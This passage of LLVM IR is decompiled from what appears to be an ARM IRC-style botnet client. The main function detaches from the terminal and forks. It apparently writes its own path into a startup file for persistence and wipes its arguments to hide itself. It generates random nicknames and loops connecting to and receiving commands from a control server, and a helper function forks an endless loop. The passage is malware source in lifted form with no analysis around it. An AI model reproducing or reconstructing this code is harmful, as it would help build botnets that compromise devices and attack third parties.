  %v1_1bdbc = phi i32 [ %v1_1bdbc.pre, %dec_label_pc_1bda4.dec_label_pc_1bdb4_crit_edge ], [ %v1_1bd18, %entry ]
  store i32 %v3_1bcf4, i32* @r4, align 4
  ret i32 %v1_1bdbc

; uselistorder directives
  uselistorder i32 %v1_1bd9c, { 1, 0 }
  uselistorder i32 %v0_1bd40, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 5, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1bd30, { 1, 0 }
}

define i32 @touchMyself(i32* %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_1bdc4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_1bdc4, i32* @ip, align 4
  %v3_1bdc8 = load i32, i32* @r4, align 4
  %v6_1bdc8 = load i32, i32* @fp, align 4
  store i32 114128, i32* %stack_var_-4, align 4
  %v2_1bdcc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_1bdcc, i32* @fp, align 4
  %v0_1bdd8 = call i32 @fork()
  store i32 %v0_1bdd8, i32* @r3, align 4
  %v2_1bde0 = icmp eq i32 %v0_1bdd8, 0
  br i1 %v2_1bde0, label %dec_label_pc_1bde8, label %dec_label_pc_1be28

dec_label_pc_1bde8:                               ; preds = %entry, %dec_label_pc_1bde8
  %v2_1bdec = load i32, i32* %arg1, align 4
  store i32 %v2_1bdec, i32* @r4, align 4
  %v0_1bdf0 = call i32 @rand()
  %v2_1be08 = srem i32 %v0_1bdf0, 128
  %v1_1be0c = add nsw i32 %v2_1be08, 1024
  %v0_1be10 = load i32, i32* @r4, align 4
  %v3_1be18 = call i32 @makeFukdString(i32 %v0_1be10, i32 %v1_1be0c, i32 %v0_1bdf0)
  %v1_1be20 = call i32 @sleep(i32 3)
  br label %dec_label_pc_1bde8

dec_label_pc_1be28:                               ; preds = %entry
  store i32 %v3_1bdc8, i32* @r4, align 4
  store i32 %v6_1bdc8, i32* @fp, align 4
  ret i32 %v0_1bdd8

; uselistorder directives
  uselistorder i32 %v0_1bdf0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 ()* @rand, { 43, 42, 41, 4, 3, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 2, 1, 0 }
  uselistorder label %dec_label_pc_1bde8, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %stack_var_-2648 = alloca i32, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-1624 = alloca i32, align 4
  %stack_var_-600 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-6752 = alloca i8**, align 4
  %stack_var_-6744 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 114240, i32* %stack_var_-4, align 4
  %v2_1be3c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_1be3c, i32* @fp, align 4
  %v2_1be50 = ptrtoint i32* %stack_var_-24 to i32
  store i8** %argv, i8*** %stack_var_-6752, align 4
  %v1_1be68 = call i32 @__GI_setsid(i32 %v2_1be50)
  %v2_1be74 = call i32 @bsd_signal(i32 13, i32 1)
  %v0_1be78 = call i32 @fork()
  %v2_1be80 = icmp eq i32 %v0_1be78, 0
  br i1 %v2_1be80, label %dec_label_pc_1c814, label %dec_label_pc_1be88

dec_label_pc_1be88:                               ; preds = %entry
  %v1_1be98 = bitcast i8*** %stack_var_-6752 to i32*
  %v2_1be98 = call i32 @touchMyself(i32* %v1_1be98)
  store i32 ptrtoint (i32* @global_var_52488.111 to i32), i32* @r0, align 4
  store i32 ptrtoint ([20 x i8]* @global_var_3ab84.1143 to i32), i32* @r1, align 4
  store i32 20, i32* @r2, align 4
  %v0_1bea8 = call i32 @memcpy()
  store i32 ptrtoint ([19 x i8]* @global_var_3ab98.1145 to i32), i32* @r0, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_37118.168 to i32), i32* @r1, align 4
  %v3_1bebc = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_3ab98.1145 to i32), i32 ptrtoint ([2 x i8]* @global_var_37118.168 to i32))
  %v2_1becc = icmp eq i32 %v3_1bebc, 0
  br i1 %v2_1becc, label %dec_label_pc_1bed4, label %dec_label_pc_1bef0

dec_label_pc_1bed4:                               ; preds = %dec_label_pc_1be88
  store i32 ptrtoint ([13 x i8]* @global_var_3abac.1148 to i32), i32* @r0, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_37118.168 to i32), i32* @r1, align 4
  %v3_1bee4 = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_3abac.1148 to i32), i32 ptrtoint ([2 x i8]* @global_var_37118.168 to i32))
  br label %dec_label_pc_1bef0

dec_label_pc_1bef0:                               ; preds = %dec_label_pc_1be88, %dec_label_pc_1bed4
  %stack_var_-68.0 = phi i32 [ %v3_1bee4, %dec_label_pc_1bed4 ], [ %v3_1bebc, %dec_label_pc_1be88 ]
  %stack_var_-72.0 = phi i8* [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_3abac.1148, i32 0, i32 0), %dec_label_pc_1bed4 ], [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_3ab98.1145, i32 0, i32 0), %dec_label_pc_1be88 ]
  %v2_1bef4 = icmp eq i32 %stack_var_-68.0, 0
  br i1 %v2_1bef4, label %dec_label_pc_1c100, label %dec_label_pc_1befc

dec_label_pc_1befc:                               ; preds = %dec_label_pc_1bef0
  %v4_1bf08 = load i8**, i8*** %stack_var_-6752, align 4
  %v1_1bf0c = bitcast i8** %v4_1bf08 to i32*
  %v2_1bf0c = load i32, i32* %v1_1bf0c, align 4
  %v1_1bf10 = inttoptr i32 %v2_1bf0c to i8*
  %v3_1bf14 = call i32 @strlen(i8* %v1_1bf10)
  %v2_1bf28 = ptrtoint i32* %stack_var_-336 to i32
  %v2_1bf34 = call i32 @getcwd(i32 %v2_1bf28, i32 256)
  store i32 ptrtoint (i32* @global_var_3abbc.1150 to i32), i32* @r1, align 4
  %v2_1bf44 = bitcast i32* %stack_var_-336 to i8*
  %v3_1bf44 = call i32 @__GI_strcoll(i8* %v2_1bf44, i32 ptrtoint (i32* @global_var_3abbc.1150 to i32))
  %v2_1bf4c = icmp eq i32 %v3_1bf44, 0
  br i1 %v2_1bf4c, label %dec_label_pc_1c07c, label %dec_label_pc_1bf64.preheader

dec_label_pc_1bf64.preheader:                     ; preds = %dec_label_pc_1befc
  %v4_1bf70.pre = load i8**, i8*** %stack_var_-6752, align 4
  %v1_1bf74 = bitcast i8** %v4_1bf70.pre to i32*
  br label %dec_label_pc_1bf64

dec_label_pc_1bf58:                               ; preds = %dec_label_pc_1bf64
  %v1_1bf5c = add i32 %stack_var_-64.0, -1
  br label %dec_label_pc_1bf64

dec_label_pc_1bf64:                               ; preds = %dec_label_pc_1bf64.preheader, %dec_label_pc_1bf58
  %stack_var_-64.0 = phi i32 [ %v1_1bf5c, %dec_label_pc_1bf58 ], [ %v3_1bf14, %dec_label_pc_1bf64.preheader ]
  %v2_1bf74 = load i32, i32* %v1_1bf74, align 4
  %v2_1bf7c = add i32 %v2_1bf74, %stack_var_-64.0
  %v1_1bf80 = inttoptr i32 %v2_1bf7c to i8*
  %v2_1bf80 = load i8, i8* %v1_1bf80, align 1
  %v7_1bf84 = icmp eq i8 %v2_1bf80, 47
  br i1 %v7_1bf84, label %dec_label_pc_1bf8c, label %dec_label_pc_1bf58

dec_label_pc_1bf8c:                               ; preds = %dec_label_pc_1bf64
  %v2_1bfa8 = ptrtoint i32* %stack_var_-600 to i32
  store i32 %v2_1bfa8, i32* @r0, align 4
  %v4_1bfbc = call i32 @sprintf(i32 %v2_1bfa8, i32 ptrtoint ([8 x i8]* @global_var_3abc0.1152 to i32), i32 %v2_1bf28)
  %v1_1c010 = inttoptr i32 %stack_var_-68.0 to i16*
  %v2_1bfc8 = ptrtoint i32* %stack_var_-1624 to i32
  %v2_1bff0 = bitcast i32* %stack_var_-1624 to i8*
  br label %dec_label_pc_1c00c.outer

dec_label_pc_1bfc4:                               ; preds = %dec_label_pc_1c00c
  %v3_1bfd8 = call i32 @fgets(i32 %v2_1bfc8, i32 1024, i32 %stack_var_-68.0)
  %v3_1bff0 = call i32 @__GI_strcasecmp(i8* %v2_1bff0, i32 %v2_1bfa8)
  %v2_1bff8 = icmp eq i32 %v3_1bff0, 0
  br i1 %v2_1bff8, label %dec_label_pc_1c000, label %dec_label_pc_1c00c

dec_label_pc_1c000:                               ; preds = %dec_label_pc_1bfc4
  %v1_1c004 = add i32 %stack_var_-60.0.ph, 1
  br label %dec_label_pc_1c00c.outer

dec_label_pc_1c00c.outer:                         ; preds = %dec_label_pc_1c000, %dec_label_pc_1bf8c
  %stack_var_-60.0.ph = phi i32 [ %v1_1c004, %dec_label_pc_1c000 ], [ 0, %dec_label_pc_1bf8c ]
  br label %dec_label_pc_1c00c

dec_label_pc_1c00c:                               ; preds = %dec_label_pc_1c00c.outer, %dec_label_pc_1bfc4
  %v2_1c010 = call i32 @feof(i16* %v1_1c010)
  %v2_1c018 = icmp eq i32 %v2_1c010, 0
  br i1 %v2_1c018, label %dec_label_pc_1bfc4, label %dec_label_pc_1c020

dec_label_pc_1c020:                               ; preds = %dec_label_pc_1c00c
  %v2_1c024 = icmp eq i32 %stack_var_-60.0.ph, 0
  %v2_1c030 = call i32 @__GI_fclose(i16* %v1_1c010)
  br i1 %v2_1c024, label %dec_label_pc_1c02c, label %dec_label_pc_1c100

dec_label_pc_1c02c:                               ; preds = %dec_label_pc_1c020
  %v4_1c034 = ptrtoint i8* %stack_var_-72.0 to i32
  store i32 %v4_1c034, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_3abc8.1154 to i32), i32* @r1, align 4
  %v3_1c03c = call i32 @__GI_fopen(i32 %v4_1c034, i32 ptrtoint (i32* @global_var_3abc8.1154 to i32))
  %v2_1c04c = icmp eq i32 %v3_1c03c, 0
  br i1 %v2_1c04c, label %dec_label_pc_1c100, label %dec_label_pc_1c054

dec_label_pc_1c054:                               ; preds = %dec_label_pc_1c02c
  %v2_1c060 = call i32 @__GI_fputs(i32 %v2_1bfa8, i32 %v3_1c03c)
  %v1_1c068 = inttoptr i32 %v3_1c03c to i16*
  %v2_1c068 = call i32 @__GI_fclose(i16* %v1_1c068)
  br label %dec_label_pc_1c100

dec_label_pc_1c07c:                               ; preds = %dec_label_pc_1befc
  %v1_1c080 = inttoptr i32 %stack_var_-68.0 to i16*
  %v2_1c080 = call i32 @__GI_fclose(i16* %v1_1c080)
  br label %dec_label_pc_1c100

dec_label_pc_1c090:                               ; preds = %dec_label_pc_1c100
  %v3_1c094 = mul i32 %storemerge14, 4
  %v4_1c0a8 = load i8**, i8*** %stack_var_-6752, align 4
  %v5_1c0a8 = ptrtoint i8** %v4_1c0a8 to i32
  %v2_1c0ac = add i32 %v5_1c0a8, %v3_1c094
  %v1_1c0b0 = inttoptr i32 %v2_1c0ac to i32*
  %v2_1c0b0 = load i32, i32* %v1_1c0b0, align 4
  store i32 %v2_1c0b0, i32* @r4, align 4
  %v2_1c0d4 = load i32, i32* %v1_1c0b0, align 4
  %v1_1c0d8 = inttoptr i32 %v2_1c0d4 to i8*
  %v3_1c0dc = call i32 @strlen(i8* %v1_1c0d8)
  %v0_1c0e4 = load i32, i32* @r4, align 4
  store i32 %v0_1c0e4, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v3_1c0dc, i32* @r2, align 4
  %v0_1c0f0 = call i32 @__GI_memset()
  %v1_1c0f8 = add nuw i32 %storemerge14, 1
  br label %dec_label_pc_1c100

dec_label_pc_1c100:                               ; preds = %dec_label_pc_1c07c, %dec_label_pc_1c054, %dec_label_pc_1bef0, %dec_label_pc_1c02c, %dec_label_pc_1c020, %dec_label_pc_1c090
  %storemerge14 = phi i32 [ %v1_1c0f8, %dec_label_pc_1c090 ], [ 1, %dec_label_pc_1c020 ], [ 1, %dec_label_pc_1c02c ], [ 1, %dec_label_pc_1bef0 ], [ 1, %dec_label_pc_1c054 ], [ 1, %dec_label_pc_1c07c ]
  %v5_1c118 = icmp slt i32 %storemerge14, %argc
  br i1 %v5_1c118, label %dec_label_pc_1c090, label %dec_label_pc_1c11c

dec_label_pc_1c11c:                               ; preds = %dec_label_pc_1c100
  %v2_1c120 = call i32 @__GI_time(i32* null)
  store i32 %v2_1c120, i32* @r0, align 4
  %v0_1c128 = call i32 @__GI_getpid()
  store i32 %v0_1c128, i32* @r0, align 4
  %v2_1c130 = xor i32 %v2_1c120, %v0_1c128
  store i32 %v2_1c130, i32* @r4, align 4
  %v0_1c134 = call i32 @getppid()
  %v0_1c13c = load i32, i32* @r4, align 4
  %v2_1c13c = add i32 %v0_1c13c, %v0_1c134
  %v1_1c144 = call i32 @srand(i32 %v2_1c13c)
  %v2_1c150 = call i32 @realrand(i32 4, i32 8)
  %v1_1c15c = call i32 @randstring(i32 %v2_1c150)
  store i32 %v1_1c15c, i32* @global_var_52594.89, align 4
  %v2_1c174 = call i32 @realrand(i32 4, i32 8)
  %v1_1c180 = call i32 @randstring(i32 %v2_1c174)
  store i32 %v1_1c180, i32* @global_var_5258c.53, align 4
  %v2_1c198 = call i32 @realrand(i32 4, i32 8)
  %v1_1c1a4 = call i32 @randstring(i32 %v2_1c198)
  store i32 %v1_1c1a4, i32* @global_var_525b8.1158, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_3abcc.1161 to i32), i32* @global_var_53710.671, align 4
  store i32 ptrtoint (i32* @global_var_3abd4.1164 to i32), i32* @global_var_536e0.1113, align 4
  store i32 0, i32* @global_var_526c0.908, align 4
  %v2_1c224 = ptrtoint i32* %stack_var_-600 to i32
  %v2_1c2e4 = ptrtoint i32* %stack_var_-344 to i32
  %v2_1c4f8 = ptrtoint i32* %stack_var_-6744 to i32
  %v2_1c534 = add i32 %v2_1be50, -6720
  %v2_1c5ec = ptrtoint i32* %stack_var_-2648 to i32
  %v2_1c5f8 = bitcast i32* %stack_var_-2648 to i8*
  %v2_1c6a0 = ptrtoint i32* %stack_var_-1624 to i32
  %v3_1c6ac = bitcast i32* %stack_var_-1624 to i8*
  br label %dec_label_pc_1c1d8

dec_label_pc_1c1d8:                               ; preds = %dec_label_pc_1c7c4, %dec_label_pc_1c4ec, %dec_label_pc_1c260, %dec_label_pc_1c11c
  %v0_1c1d8 = call i32 @con()
  %v2_1c1e0 = load i32, i32* @global_var_52598.39, align 4
  store i32 %v2_1c1e0, i32* @r4, align 4
  %v1_1c1e4 = call i32 @getBuild(i32 %v0_1c1d8)
  %v0_1c210 = load i32, i32* @r4, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_36e08.96 to i32), i32* @r2, align 4
  %v3_1c220 = call i32 @Send(i32 %v0_1c210, i32 ptrtoint ([48 x i8]* @global_var_3abd8.1168 to i32))
  br label %dec_label_pc_1c238.lr.ph

dec_label_pc_1c238.lr.ph:                         ; preds = %dec_label_pc_1c4a4, %dec_label_pc_1c524, %dec_label_pc_1c7e0, %dec_label_pc_1c800, %dec_label_pc_1c1d8
  br label %dec_label_pc_1c238

dec_label_pc_1c238:                               ; preds = %dec_label_pc_1c238.lr.ph, %dec_label_pc_1c238
  %storemerge1528 = phi i32 [ 0, %dec_label_pc_1c238.lr.ph ], [ %v1_1c24c, %dec_label_pc_1c238 ]
  %v5_1c244 = mul nuw nsw i32 %storemerge1528, 4
  %v6_1c244 = add i32 %v5_1c244, %v2_1c224
  %v7_1c244 = inttoptr i32 %v6_1c244 to i32*
  store i32 0, i32* %v7_1c244, align 4
  %v1_1c24c = add nuw nsw i32 %storemerge1528, 1
  %tmp74 = icmp ult i32 %v1_1c24c, 32
  br i1 %tmp74, label %dec_label_pc_1c238, label %dec_label_pc_1c260

dec_label_pc_1c260:                               ; preds = %dec_label_pc_1c238
  %v2_1c264 = load i32, i32* @global_var_52598.39, align 4
  %v3_1c268 = udiv i32 %v2_1c264, 32
  %v3_1c27c = mul nuw nsw i32 %v3_1c268, 4
  %v2_1c284 = add i32 %v3_1c27c, %v2_1be50
  %v2_1c288 = add i32 %v2_1c284, -576
  %v1_1c28c = inttoptr i32 %v2_1c288 to i32*
  %v2_1c28c = load i32, i32* %v1_1c28c, align 4
  %v1_1c298 = urem i32 %v2_1c264, 32
  %v6_1c2a0 = shl i32 1, %v1_1c298
  %v2_1c2a4 = or i32 %v2_1c28c, %v6_1c2a0
  store i32 %v2_1c2a4, i32* %v1_1c28c, align 4
  store i32 1200, i32* %stack_var_-344, align 4
  %v2_1c2d8 = load i32, i32* @global_var_52598.39, align 4
  %v1_1c2dc = add i32 %v2_1c2d8, 1
  %v5_1c2f8 = call i32 @__libc_select(i32 %v1_1c2dc, i32 %v2_1c224, i32 0, i32 0, i32 %v2_1c2e4)
  %tmp75 = icmp slt i32 %v5_1c2f8, 1
  br i1 %tmp75, label %dec_label_pc_1c1d8, label %dec_label_pc_1c490.preheader

dec_label_pc_1c490.preheader:                     ; preds = %dec_label_pc_1c260
  %v2_1c494104 = load i32, i32* @global_var_49b48.43, align 4
  %v3_1c49c106 = icmp eq i32 %v2_1c494104, 0
  br i1 %v3_1c49c106, label %dec_label_pc_1c4a4, label %dec_label_pc_1c314

dec_label_pc_1c314:                               ; preds = %dec_label_pc_1c484, %dec_label_pc_1c490.preheader
  %storemerge16113 = phi i32 [ %.pre131, %dec_label_pc_1c484 ], [ 0, %dec_label_pc_1c490.preheader ]
  %v3_1c318 = mul i32 %storemerge16113, 4
  %v2_1c324 = load i32, i32* @global_var_53718.45, align 4
  %v2_1c328 = add i32 %v2_1c324, %v3_1c318
  %v1_1c32c = inttoptr i32 %v2_1c328 to i32*
  %v2_1c32c = load i32, i32* %v1_1c32c, align 4
  %v3_1c33c = call i32 @waitpid(i32 %v2_1c32c, i32 0, i32 1)
  %tmp76 = icmp slt i32 %v3_1c33c, 1
  %.pre131 = add i32 %storemerge16113, 1
  br i1 %tmp76, label %dec_label_pc_1c484, label %dec_label_pc_1c3a0.preheader

dec_label_pc_1c3a0.preheader:                     ; preds = %dec_label_pc_1c314
  %v2_1c3a483 = load i32, i32* @global_var_49b48.43, align 4
  %v3_1c3ac85 = icmp ult i32 %.pre131, %v2_1c3a483
  %v2_1c3b886 = load i32, i32* @global_var_53718.45, align 4
  %v1_1c3bc87 = add i32 %v2_1c3b886, -4
  %v3_1c3c488 = mul i32 %.pre131, 4
  %v2_1c3c889 = add i32 %v1_1c3bc87, %v3_1c3c488
  br i1 %v3_1c3ac85, label %dec_label_pc_1c35c, label %dec_label_pc_1c3b4

dec_label_pc_1c35c:                               ; preds = %dec_label_pc_1c3a0.preheader, %dec_label_pc_1c35c
  %v2_1c3c893 = phi i32 [ %v2_1c3c8, %dec_label_pc_1c35c ], [ %v2_1c3c889, %dec_label_pc_1c3a0.preheader ]
  %v3_1c3c492 = phi i32 [ %v3_1c3c4, %dec_label_pc_1c35c ], [ %v3_1c3c488, %dec_label_pc_1c3a0.preheader ]
  %v2_1c3b891 = phi i32 [ %v2_1c3b8, %dec_label_pc_1c35c ], [ %v2_1c3b886, %dec_label_pc_1c3a0.preheader ]
  %v1_1c35090 = phi i32 [ %v1_1c350, %dec_label_pc_1c35c ], [ %.pre131, %dec_label_pc_1c3a0.preheader ]
  %v2_1c388 = add i32 %v2_1c3b891, %v3_1c3c492
  %v1_1c38c = inttoptr i32 %v2_1c388 to i32*
  %v2_1c38c = load i32, i32* %v1_1c38c, align 4
  %v2_1c390 = inttoptr i32 %v2_1c3c893 to i32*
  store i32 %v2_1c38c, i32* %v2_1c390, align 4
  %v1_1c350 = add i32 %v1_1c35090, 1
  %v2_1c3a4 = load i32, i32* @global_var_49b48.43, align 4
  %v3_1c3ac = icmp ult i32 %v1_1c350, %v2_1c3a4
  %v2_1c3b8 = load i32, i32* @global_var_53718.45, align 4
  %v1_1c3bc = add i32 %v2_1c3b8, -4
  %v3_1c3c4 = mul i32 %v1_1c350, 4
  %v2_1c3c8 = add i32 %v1_1c3bc, %v3_1c3c4
  br i1 %v3_1c3ac, label %dec_label_pc_1c35c, label %dec_label_pc_1c3a0.dec_label_pc_1c3b4_crit_edge

dec_label_pc_1c3a0.dec_label_pc_1c3b4_crit_edge:  ; preds = %dec_label_pc_1c35c
  br label %dec_label_pc_1c3b4

dec_label_pc_1c3b4:                               ; preds = %dec_label_pc_1c3a0.dec_label_pc_1c3b4_crit_edge, %dec_label_pc_1c3a0.preheader
  %v2_1c3c8.lcssa = phi i32 [ %v2_1c3c8, %dec_label_pc_1c3a0.dec_label_pc_1c3b4_crit_edge ], [ %v2_1c3c889, %dec_label_pc_1c3a0.preheader ]
  %v2_1c3d0 = inttoptr i32 %v2_1c3c8.lcssa to i32*
  store i32 0, i32* %v2_1c3d0, align 4
  %v2_1c3d8 = load i32, i32* @global_var_49b48.43, align 4
  %v1_1c3dc = add i32 %v2_1c3d8, -1
  store i32 %v1_1c3dc, i32* @global_var_49b48.43, align 4
  %v3_1c3f4 = mul i32 %v2_1c3d8, 4
  %v1_1c3fc = call i32 @malloc(i32 %v3_1c3f4)
  %v2_1c45897 = load i32, i32* @global_var_49b48.43, align 4
  %v3_1c46099 = icmp eq i32 %v2_1c45897, 0
  br i1 %v3_1c46099, label %dec_label_pc_1c468, label %dec_label_pc_1c414

dec_label_pc_1c414:                               ; preds = %dec_label_pc_1c3b4, %dec_label_pc_1c414
  %storemerge18100 = phi i32 [ %v1_1c44c, %dec_label_pc_1c414 ], [ 0, %dec_label_pc_1c3b4 ]
  %v3_1c418 = mul i32 %storemerge18100, 4
  %v2_1c424 = add i32 %v3_1c418, %v1_1c3fc
  %v2_1c438 = load i32, i32* @global_var_53718.45, align 4
  %v2_1c43c = add i32 %v2_1c438, %v3_1c418
  %v1_1c440 = inttoptr i32 %v2_1c43c to i32*
  %v2_1c440 = load i32, i32* %v1_1c440, align 4
  %v2_1c444 = inttoptr i32 %v2_1c424 to i32*
  store i32 %v2_1c440, i32* %v2_1c444, align 4
  %v1_1c44c = add i32 %storemerge18100, 1
  %v2_1c458 = load i32, i32* @global_var_49b48.43, align 4
  %v3_1c460 = icmp ult i32 %v1_1c44c, %v2_1c458
  br i1 %v3_1c460, label %dec_label_pc_1c414, label %dec_label_pc_1c454.dec_label_pc_1c468_crit_edge

dec_label_pc_1c454.dec_label_pc_1c468_crit_edge:  ; preds = %dec_label_pc_1c414
  br label %dec_label_pc_1c468

dec_label_pc_1c468:                               ; preds = %dec_label_pc_1c3b4, %dec_label_pc_1c454.dec_label_pc_1c468_crit_edge
  %v2_1c46c = load i32, i32* @global_var_53718.45, align 4
  store i32 %v2_1c46c, i32* @r0, align 4
  %v0_1c474 = call i32 @free()
  store i32 %v1_1c3fc, i32* @global_var_53718.45, align 4
  br label %dec_label_pc_1c484

dec_label_pc_1c484:                               ; preds = %dec_label_pc_1c314, %dec_label_pc_1c468
  %v2_1c494 = load i32, i32* @global_var_49b48.43, align 4
  %v3_1c49c = icmp ult i32 %.pre131, %v2_1c494
  br i1 %v3_1c49c, label %dec_label_pc_1c314, label %dec_label_pc_1c4a4

dec_label_pc_1c4a4:                               ; preds = %dec_label_pc_1c484, %dec_label_pc_1c490.preheader
  %v2_1c4a8 = load i32, i32* @global_var_52598.39, align 4
  %v3_1c4ac = udiv i32 %v2_1c4a8, 32
  %v3_1c4b8 = mul nuw nsw i32 %v3_1c4ac, 4
  %v2_1c4c0 = add i32 %v3_1c4b8, %v2_1be50
  %v2_1c4c4 = add i32 %v2_1c4c0, -576
  %v1_1c4c8 = inttoptr i32 %v2_1c4c4 to i32*
  %v2_1c4c8 = load i32, i32* %v1_1c4c8, align 4
  %v1_1c4d4 = urem i32 %v2_1c4a8, 32
  %v6_1c4d84 = lshr i32 %v2_1c4c8, %v1_1c4d4
  %v1_1c4e0 = urem i32 %v6_1c4d84, 2
  %v2_1c4e4 = icmp eq i32 %v1_1c4e0, 0
  br i1 %v2_1c4e4, label %dec_label_pc_1c238.lr.ph, label %dec_label_pc_1c4ec

dec_label_pc_1c4ec:                               ; preds = %dec_label_pc_1c4a4
  %v4_1c50c = call i32 @recv(i32 %v2_1c4a8, i32 %v2_1c4f8, i32 4096, i32 0)
  %tmp77 = icmp slt i32 %v4_1c50c, 1
  br i1 %tmp77, label %dec_label_pc_1c1d8, label %dec_label_pc_1c524

dec_label_pc_1c524:                               ; preds = %dec_label_pc_1c4ec
  %v2_1c538 = add i32 %v2_1c534, %v4_1c50c
  %v3_1c540 = inttoptr i32 %v2_1c538 to i8*
  store i8 0, i8* %v3_1c540, align 1
  store i32 %v2_1c4f8, i32* @r0, align 4
  %v2_1c554 = call i32 @__GI_strtok(i32 %v2_1c4f8, i32 ptrtoint (i32* @global_var_3ac08.1173 to i32))
  %v2_1c7f831 = icmp eq i32 %v2_1c554, 0
  br i1 %v2_1c7f831, label %dec_label_pc_1c238.lr.ph, label %dec_label_pc_1c800

dec_label_pc_1c564:                               ; preds = %dec_label_pc_1c800
  %v3_1c568 = call i32 @filter(i8* nonnull %storemerge33)
  %v2_1c570 = load i8, i8* %storemerge33, align 1
  %v7_1c574 = icmp eq i8 %v2_1c570, 58
  br i1 %v7_1c574, label %dec_label_pc_1c594, label %dec_label_pc_1c620

dec_label_pc_1c588:                               ; preds = %dec_label_pc_1c5ac
  %v1_1c58c = add i32 %storemerge23, 1
  br label %dec_label_pc_1c594

dec_label_pc_1c594:                               ; preds = %dec_label_pc_1c564, %dec_label_pc_1c588
  %storemerge23 = phi i32 [ %v1_1c58c, %dec_label_pc_1c588 ], [ 0, %dec_label_pc_1c564 ]
  %v3_1c59c = call i32 @strlen(i8* %storemerge33)
  %v3_1c5a4 = icmp ult i32 %storemerge23, %v3_1c59c
  br i1 %v3_1c5a4, label %dec_label_pc_1c5ac, label %dec_label_pc_1c594.dec_label_pc_1c5c8_crit_edge

dec_label_pc_1c594.dec_label_pc_1c5c8_crit_edge:  ; preds = %dec_label_pc_1c594
  %.pre = add i32 %storemerge23, %storemerge33.in
  %.pre35 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_1c5c8

dec_label_pc_1c5ac:                               ; preds = %dec_label_pc_1c594
  %v2_1c5b8 = add i32 %storemerge23, %storemerge33.in
  %v1_1c5bc = inttoptr i32 %v2_1c5b8 to i8*
  %v2_1c5bc = load i8, i8* %v1_1c5bc, align 1
  %v7_1c5c0 = icmp eq i8 %v2_1c5bc, 32
  br i1 %v7_1c5c0, label %dec_label_pc_1c5c8, label %dec_label_pc_1c588

dec_label_pc_1c5c8:                               ; preds = %dec_label_pc_1c5ac, %dec_label_pc_1c594.dec_label_pc_1c5c8_crit_edge
  %v3_1c5dc.pre-phi = phi i8* [ %.pre35, %dec_label_pc_1c594.dec_label_pc_1c5c8_crit_edge ], [ %v1_1c5bc, %dec_label_pc_1c5ac ]
  %v2_1c5d4.pre-phi = phi i32 [ %.pre, %dec_label_pc_1c594.dec_label_pc_1c5c8_crit_edge ], [ %v2_1c5b8, %dec_label_pc_1c5ac ]
  store i8 0, i8* %v3_1c5dc.pre-phi, align 1
  %v1_1c5e4 = add i32 %storemerge33.in, 1
  store i32 %v1_1c5e4, i32* @r1, align 4
  %v3_1c5f8 = call i32 @strcpy(i8* %v2_1c5f8, i32 %v1_1c5e4)
  %v1_1c60c = add i32 %v2_1c5d4.pre-phi, 1
  store i32 %v1_1c60c, i32* @r1, align 4
  %v4_1c618 = call i32 @strcpy(i8* %storemerge33, i32 %v1_1c60c)
  br label %dec_label_pc_1c638

dec_label_pc_1c620:                               ; preds = %dec_label_pc_1c564
  store i32 %v2_1c5ec, i32* @r3, align 4
  store i32 %v2_1c5ec, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_3ac0c.1175 to i32), i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  %v0_1c634 = call i32 @memcpy()
  br label %dec_label_pc_1c638

dec_label_pc_1c638:                               ; preds = %dec_label_pc_1c5c8, %dec_label_pc_1c620
  br label %dec_label_pc_1c650

dec_label_pc_1c644:                               ; preds = %dec_label_pc_1c668
  %v1_1c648 = add i32 %storemerge20, 1
  br label %dec_label_pc_1c650

dec_label_pc_1c650:                               ; preds = %dec_label_pc_1c638, %dec_label_pc_1c644
  %storemerge20 = phi i32 [ 0, %dec_label_pc_1c638 ], [ %v1_1c648, %dec_label_pc_1c644 ]
  store i32 %storemerge20, i32* @r4, align 4
  %v3_1c658 = call i32 @strlen(i8* %storemerge33)
  %v0_1c660 = load i32, i32* @r4, align 4
  %v3_1c660 = icmp ult i32 %v0_1c660, %v3_1c658
  br i1 %v3_1c660, label %dec_label_pc_1c668, label %dec_label_pc_1c650.dec_label_pc_1c684_crit_edge

dec_label_pc_1c650.dec_label_pc_1c684_crit_edge:  ; preds = %dec_label_pc_1c650
  %.pre36 = add i32 %storemerge20, %storemerge33.in
  %.pre37 = inttoptr i32 %.pre36 to i8*
  br label %dec_label_pc_1c684

dec_label_pc_1c668:                               ; preds = %dec_label_pc_1c650
  %v2_1c674 = add i32 %storemerge20, %storemerge33.in
  %v1_1c678 = inttoptr i32 %v2_1c674 to i8*
  %v2_1c678 = load i8, i8* %v1_1c678, align 1
  %v7_1c67c = icmp eq i8 %v2_1c678, 32
  br i1 %v7_1c67c, label %dec_label_pc_1c684, label %dec_label_pc_1c644

